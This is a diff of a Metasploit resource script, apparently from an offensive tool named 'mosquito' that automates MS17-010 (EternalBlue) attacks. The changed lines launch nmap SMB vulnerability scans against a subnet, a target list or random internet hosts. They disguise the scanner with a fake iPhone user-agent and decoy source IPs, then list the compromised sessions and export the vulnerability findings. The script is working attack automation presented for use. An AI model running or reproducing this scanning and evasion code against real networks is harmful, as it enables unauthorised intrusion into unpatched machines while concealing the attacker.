@@ -82,12 +82,12 @@
       ## db_nmap WAN or RHOSTS or LOCAL_LAN scan settings
       # HINT: nmap will use a fake user-agent string (iPhone:Safari) while scanning.
       if (framework.datastore['RHOSTS'] == "#{ip_range}.0/24")
-         run_single("db_nmap -sS -v -Pn -T4 -O -p 135,137,139,445 --open --script=banner.nse,http-headers.nse,smb-os-discovery.nse,smb-brute.nse,smb-vuln-ms17-010.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\" #{framework.datastore['RHOSTS']}")
+         run_single("db_nmap -sS -v -Pn -T4 -O -p 135,137,139,445 --open --script=banner.nse,http-headers.nse,smb-os-discovery.nse,smb-vuln-ms17-010.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\" #{framework.datastore['RHOSTS']}")
       elsif (framework.datastore['RANDOM_HOSTS'] == "true")
          print_status("Nmap: search for random remote hosts with ports 135:137:139:445 open")
-         run_single("db_nmap -sS -vvv -Pn -T4 -iR #{framework.datastore['LIMMIT']} -p 135,137,139,445 --open --script=banner.nse,http-headers.nse,smb-os-discovery.nse,smb-brute.nse,smb-vuln-ms17-010.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\" -D 172.217.17.4,65.49.82.3")
+         run_single("db_nmap -sS -vvv -Pn -T4 -iR #{framework.datastore['LIMMIT']} -p 135,137,139,445 --open --script=banner.nse,http-headers.nse,smb-os-discovery.nse,smb-vuln-ms17-010.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\" -D 172.217.17.4,65.49.82.3")
       else
-         run_single("db_nmap -sS -v -Pn -T4 -O -p 135,137,139,445 --open --script=banner.nse,http-headers.nse,smb-os-discovery.nse,smb-brute.nse,smb-vuln-ms17-010.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\" -D 172.217.17.4,65.49.82.3 #{framework.datastore['RHOSTS']}")
+         run_single("db_nmap -sS -v -Pn -T4 -O -p 135,137,139,445 --open --script=banner.nse,http-headers.nse,smb-os-discovery.nse,smb-vuln-ms17-010.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\" -D 172.217.17.4,65.49.82.3 #{framework.datastore['RHOSTS']}")
       end
 
       ## Read metasploit database
@@ -317,19 +317,26 @@
          run_single("db_export -f xml -a #{local}/logs/database_#{rand}.xml")
       end
 
+      print_line("")
+      ## Display active sessions
+      run_single("sessions -l")
+      print_line("")
       ## Cleaning database and unset global variables
-      print_warning("Please wait, Cleaning global variables.")
+      print_warning("Cleaning global variables.")
       Rex::sleep(1.5)
       run_single("unsetg all")
       run_single("unset all")
       run_single("workspace -d mosquito")
 
-      dtr = `date`
       ## Writting ['xhost(s)'] to mosquito logfile
       if File.directory?("#{local}/logs")
-         print_warning("Logfile stored under: #{local}/logs/ms17_010.log")
-         run_single("echo \"[#{dtr}] ms17_010: #{xhost}\" >> logs/mosquito.log")
+         print_status("Logfile stored under: #{local}/logs/ms17_010.log")
+         ## Store vulns log if exists open sessions
+         if (framework.sessions.length > 0)
+            run_single("vulns -o #{local}/logs/ms17_010.csv")
+         end
       end
+
       File.delete("ip_range.txt") if File.exist?("ip_range.txt")
       run_single("back")
    </ruby>
